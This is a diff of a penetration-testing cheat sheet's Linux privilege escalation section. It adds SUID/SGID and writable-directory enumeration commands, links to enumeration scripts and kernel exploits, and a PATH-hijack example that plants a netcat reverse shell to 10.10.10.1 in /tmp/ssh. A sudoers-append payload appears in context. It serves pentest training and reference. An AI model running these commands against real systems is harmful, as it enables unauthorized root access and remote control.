@@ -1207,20 +1207,64 @@ Privilege Escalation
 -   Linux Privilege Escalation
     ------------------------------------------------------------------------------------------------------------------------
 
+-   Defacto Linux Privilege Escalation Guide  - A much more through guide for linux enumeration:
+    [*https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/*](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+
 -   Try the obvious - Maybe the user can sudo to root:  
     sudo su
     
--   Highon.coffee Linux Local Enum 
-    `wget https://highon.coffee/downloads/linux-local-enum.sh`
+-   Here are the commands I have learned to use to perform linux enumeration and privledge escalation:
 
--   Basic Linux Privilege Escalation  
-    [*https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/*](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+    What services are running as root?:
+    
+    `ps aux | grep root`
+    
+    What files run as root / SUID / GUID?:
+    
+    ```
+    find / -perm +2000 -user root -type f -print
+    find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
 
--   Linux Privilege Exploit Suggester  
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+```
+    
+    What folders are world writeable?:
+    ```
+    find / -writable -type d 2>/dev/null      # world-writeable folders
+     find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+    find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+
+      find / -perm -o x -type d 2>/dev/null     # world-executable folders
+
+      find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+    ```
+    
+-   There are a few scripts that can automate the linux enumeration process:
+
+      - LinEnum - (Recently Updated)
+      [*https://github.com/rebootuser/LinEnum*](https://github.com/rebootuser/LinEnum)
+      
+      - linux-exploit-suggester (Recently Updated)
+      [*https://github.com/mzet-/linux-exploit-suggester*](https://github.com/mzet-/linux-exploit-suggester)
+      
+      -   Highon.coffee Linux Local Enum - Great enumeration script!
+          `wget https://highon.coffee/downloads/linux-local-enum.sh`
+
+      -   Linux Privilege Exploit Suggester  (Old has not been updated in years)
     [*https://github.com/PenturaLabs/Linux\_Exploit\_Suggester*](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
 
--   Linux post exploitation enumeration and exploit checking tools  
+      -   Linux post exploitation enumeration and exploit checking tools  
     [*https://github.com/reider-roque/linpostexp*](https://github.com/reider-roque/linpostexp)
+    
+
+
+Handy exploits:
 
 -   CVE-2010-3904 - Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8  
     [*https://www.exploit-db.com/exploits/15285/*](https://www.exploit-db.com/exploits/15285/)
@@ -1295,7 +1339,17 @@ Privilege Escalation
     ALL" &gt;&gt; /etc/sudoers && chmod 440 /etc/sudoers' &gt;
     /tmp/update
     
- -   SearchSploit  
+-   You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable
+    to execute your command instead.  In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on 
+    port 4444.
+    
+```
+set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
+chmod +x ssh
+```
+
+-   SearchSploit  
      searchsploit –uncsearchsploit apache 2.2  
      searchsploit "Linux Kernel"  
      searchsploit linux 2.6 | grep -i ubuntu | grep local  
